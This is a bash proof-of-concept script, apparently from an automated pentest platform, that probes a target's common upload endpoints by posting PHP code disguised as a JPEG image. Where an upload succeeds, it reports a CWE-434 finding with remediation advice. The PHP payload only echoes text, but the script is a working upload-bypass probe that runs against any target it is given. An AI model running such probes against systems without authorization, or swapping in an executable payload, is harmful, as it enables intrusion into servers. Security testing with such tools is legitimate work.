#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        File Upload Content-Type Bypass
# Description: Tests if server validates file content vs declared type
# Severity:    HIGH
# Category:    Framework & API Security (Laravel, WordPress, Spring, GraphQL)
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: File Upload Content-Type Bypass\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
# find upload endpoints
PATHS="upload api/upload api/v1/upload file/upload api/file uploads/upload.php upload.php api/media"
for P in $PATHS; do
  R=$(curl -s -o /dev/null -w "%{http_code}" -X POST --max-time 10 "$T/$P" 2>/dev/null)
  if [ "$R" != "404" ] && [ "$R" != "000" ]; then
    # try uploading PHP content as image
    RESP=$(echo '<?php echo "test"; ?>' | curl -s -X POST -F "file=@-;filename=test.jpg;type=image/jpeg" --max-time 10 "$T/$P" 2>/dev/null | head -c 500)
    if echo "$RESP" | grep -qi "success\|uploaded\|url\|path"; then
      URL=$(echo "$RESP" | grep -oE 'https\?://[^"]+' | head -1)
      emit "{\"title\":\"File upload accepts PHP content as image: /$P\",\"severity\":\"high\",\"description\":\"Upload endpoint /$P accepted a file with PHP code declared as image/jpeg. If stored with executable extension or in web root, RCE possible.\",\"remediation\":\"Validate file content (magic bytes), not just Content-Type. Store uploads outside web root. Randomize filenames.\",\"cweId\":\"CWE-434\",\"owaspCategory\":\"A04:2025-Insecure Design\"}"
    fi
  fi
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
